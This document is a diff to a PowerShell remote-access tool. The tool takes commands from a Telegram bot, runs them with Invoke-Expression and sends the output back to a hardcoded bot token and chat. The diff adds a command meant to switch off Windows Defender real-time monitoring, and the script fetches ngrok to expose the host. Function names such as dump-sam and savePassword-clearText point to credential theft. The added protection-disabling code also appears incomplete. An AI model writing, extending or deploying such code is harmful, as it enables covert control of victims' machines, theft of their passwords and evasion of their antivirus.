@@ -3,7 +3,7 @@ function run-asAdmin($path,$password)
 {
     if (is-administartor)
     {
-        return "alredy ru as admin."
+        return "alredy run as admin."
     }
     $vbscript = @('set WshShell = WScript.CreateObject("WScript.Shell")'
     'WshShell.Run "cmd"'
@@ -49,14 +49,19 @@ function Excmd
 
    param
    (
-          [Parameter(Mandatory)]
-      [string] $command
+        [Parameter(Mandatory)]
+        [string] $command
     )
-   $ProgressPreference = 'SilentlyContinue' 
-   $out = Invoke-Expression -Command $command | Out-String
-   $ProgressPreference = 'Continue'
-   return $out
+    try{
+        $out = Invoke-Expression -Command $command | Out-String
+        return $out
+    }
+    catch{
+        return "Failed to run command"
+    }
+   
 }
+
 
 function Send-data ($data,$apiToken,$chat_id)
 {
@@ -210,6 +215,11 @@ function start-myshell($apiToken,$chat_id,$urlToNG)
                     {
                         Send-data -data $i -chat_id $chat_id -apiToken $apiToken  
                     }
+                }
+                ElseIf($command.contains('disable real time protecion'))
+                {
+                    $output = disable-protection
+                    Send-data -data $output -chat_id $chat_id -apiToken $apiToken 
                 }
                 else{
                     $output = Excmd $command
@@ -397,6 +407,33 @@ function dump-sam{
     return $files 
 }
 
+function IsMonitoring-Disable
+{
+    return (get-MpPreference | select DisableRealtimeMonitoring).DisableRealtimeMonitoring
+}
+
+
+function disable-protection
+{
+    if (is-administartor -like $false)
+    {
+        return "Program must run as admin."
+    }
+    if (IsMonitoring-Disable)
+    {
+        return "Real time protection is alredy Disable."
+    }
+    try{
+        $testDisable
+        if ($testDisable -eq $null)
+        {
+            return "Successfully completed"
+        } 
+    }catch{
+        return "Error has occurred"
+    }
+}
+
 function savePassword-clearText
 {
     if (-not(is-administartor))
@@ -418,7 +455,7 @@ Set-Location C:\
 try
 {
     $path_to_ngrok = "C:\ngrok\ngrok.exe"
-    if([System.IO.File]::Exists($path_to_ngrok)-eq $false)
+    if([System.IO.File]::Exists($path_to_ngrok) -like $false)
     {
         mkdir C:\ngrok
         Invoke-WebRequest "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip" -OutFile C:\ngrok\ngrok.zip
@@ -436,4 +473,3 @@ catch{
 $apiToken = '5603815915:AAGbkRsoHpMmncrkM7GZPHImydZDSclfysA'
 $chat_id = '-1001830797904'
 start-myshell -apiToken $apiToken -chat_id $chat_id -urlToNG $urlToNG
-
